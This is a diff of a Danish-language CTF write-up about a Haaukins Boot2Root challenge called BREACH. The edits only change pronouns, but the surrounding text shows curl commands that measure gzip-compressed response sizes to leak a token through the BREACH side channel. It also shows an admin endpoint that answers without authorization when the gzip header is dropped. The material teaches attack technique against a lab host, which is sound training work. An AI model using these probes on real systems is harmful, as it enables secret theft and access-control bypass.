@@ -28,7 +28,7 @@
 <div class="badges"><span class="badge cat">Boot2Root</span><span class="badge">Haaukins CTF</span></div>
 <div class="callout">🎓 <strong>Prøv selv først.</strong> Trinnene viser metoden, det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
 
-<h2>Sporet: hvorfor leder vi efter en sidekanal?</h2>
+<h2>Sporet: hvorfor leder jeg efter en sidekanal?</h2>
 <p>Opgaveteksten er selv et ordspil: <em>"På overfladen ser fresh-start.hkn ud som en
              almindelig rengøringstjeneste men hvilket snavs kan mon opfanges."</em> "Opfange snavs" er
              en omskrivning af "aflæse et lækket signal", og opgavens titel, BREACH, navngiver angrebet
@@ -46,7 +46,7 @@
              <pre><code>curl -s "http://fresh-start.hkn/guest/token?request=TEST" \
   -H "Accept-Encoding: gzip" --compressed
 # &lt;p&gt;7f4d10ac20b9edfbb495baf51c5a7a3&lt;/p&gt;   &lt;-- et token, ukendt oprindelse
-# &lt;p&gt;TEST&lt;/p&gt;                              &lt;-- vores eget input, reflekteret</code></pre>
+# &lt;p&gt;TEST&lt;/p&gt;                              &lt;-- mit eget input, reflekteret</code></pre>
              <p>Begge dele ligger i SAMME komprimerede HTML-side, det er netop BREACH-opskriften. Mål
              komprimeret størrelse for tre forskellige gæt:</p>
              <pre><code>curl -s ".../guest/token?request=" -H "Accept-Encoding: gzip" \
@@ -67,7 +67,7 @@ curl -s ".../guest/token?request=0000000000000000000000000000000" ...
              <pre><code>curl -s "http://fresh-start.hkn/admin/token?request=" \
   -H "Accept-Encoding: gzip" --compressed
 # HTTP 401 Unauthorized</code></pre>
-             <p>Endpointet findes, men kræver noget vi ikke har endnu. Afgørende detalje: prøv SAMME
+             <p>Endpointet findes, men kræver noget jeg ikke har endnu. Afgørende detalje: prøv SAMME
              request uden <code>Accept-Encoding: gzip</code>-headeren:</p>
              <pre><code>curl -s "http://fresh-start.hkn/admin/token?request="
 # HTTP 200
